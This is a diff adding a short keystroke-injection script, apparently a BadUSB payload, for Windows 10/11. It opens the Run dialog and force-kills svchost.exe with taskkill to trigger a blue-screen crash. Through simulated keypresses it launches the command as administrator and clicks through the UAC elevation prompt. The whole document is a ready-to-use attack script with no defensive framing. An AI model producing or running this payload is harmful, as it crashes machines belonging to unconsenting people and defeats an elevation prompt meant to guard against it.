@@ -1,0 +1,14 @@
+REM Description: Will kill svchost that will result in a BSOD, but after it restarts everything will be fine.
+REM OS: Windows 10/11
+DELAY 500
+GUI r
+DELAY 2000
+STRING taskkill -im svchost.exe /f
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1500
+LEFT
+DELAY 500
+SPACE
+DELAY 500
+ENTER
